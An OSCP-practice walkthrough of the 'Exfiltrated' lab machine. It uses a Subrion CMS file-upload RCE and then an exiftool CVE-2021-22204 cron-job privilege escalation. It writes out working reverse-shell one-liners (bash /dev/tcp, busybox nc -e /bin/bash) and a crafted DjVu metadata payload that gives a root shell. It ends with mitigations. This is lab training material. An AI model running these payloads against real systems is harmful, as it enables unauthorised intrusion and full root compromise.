---
title: Exfiltrated
date: 2025-05-09
categories: [oscp, pg-practice]
tags: [oscp-preparation, walkthrough, CVE-2018-19422, .djvu, exiftool-cronjob-privesc, CVE-2021-22204 ] 
image: exfil.png
media_subpath: /assets/img/posts/2025-05-12-exfiltrated/
---

## Introduction

In this walkthrough, I exploited a **Subrion CMS** instance that was vulnerable to an **authenticated file upload bypass**, which allowed me to upload a malicious PHP file and achieve **remote code execution**. After gaining a foothold, I continued enumeration and discovered a **cron job running as root** that executed `exiftool` every minute.

The installed version of `exiftool` fell within a **vulnerable range affected by CVE-2021-22204**, which allows arbitrary code execution via crafted image metadata. I created a malicious image file to exploit this vulnerability and, once processed by the cron job, successfully **escalated privileges to root**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - Apache httpd 2.4.41 ((Ubuntu))

Add domain to `/etc/hosts` file:

![image.png](image%202.png)

I saw at the bottom the Subrion CMS and used public exploit to get a shell:

![image.png](image%203.png)

[https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE/blob/main/README.md](https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE/blob/main/README.md)

```powershell
python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```

![image.png](image%204.png)

Let’s get a reverse shell from here.

```powershell
bash -i >& /dev/tcp/192.168.45.242/443 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.45.242/443 0>&1'
#these didn't work

busybox nc 192.168.45.242 443 -e /bin/bash
```

I searched for `busybox` and find that it exists, and used it to get a reverse shell.

```powershell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then used python to get an interactive shell.

## Privilege Escalation

- **OSCP Checklist**
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo
    - [ ]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    

While checking cron jobs we see:

```bash
cat /etc/crontab
```

![image.png](image%205.png)

```bash
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"

IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

it just takes an image from `/var/www/html/subrion/uploads` and stored its exifdata in a file with randomly generated filename.

I searched for ways of leveraging exiftool for privilege escalation and most promising thing among all is CVE-2021-22204. I checked my exiftool version and it was in vulnerable range.

![image.png](image%206.png)

Then I followed the following post [**Exiftool Privilege Escalation**](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/) and used the following exploit:

```bash
(metadata "\c${system('busybox nc 192.168.45.242 4444 -e /bin/bash')};")
```

If someone struggles with downloading djvulibre use 

```bash
sudo apt install -y djvulibre-bin --fix-missing 
```

After that I saw that it just greps for the expression `jpg` so I changed the exploit name to `jpg.djvu` at the end and put it inside `/var/www/html/subrion/uploads`, and as the cron job is run by root user I received reverse shell as root user.

![image.png](image%207.png)

## Mitigation

- **Update Subrion CMS** to the latest version and apply any available patches for file upload validation mechanisms.
- Implement **strict file type and content validation** on file uploads, especially in authenticated areas of CMS applications.
- **Upgrade exiftool** to a version patched against **CVE-2021-22204** to prevent exploitation via crafted image metadata.
- Review and secure **cron jobs** running as root — ensure they do not process user-controlled files or input.
- Use **AppArmor/SELinux** to restrict what system utilities like `exiftool` can access or execute.
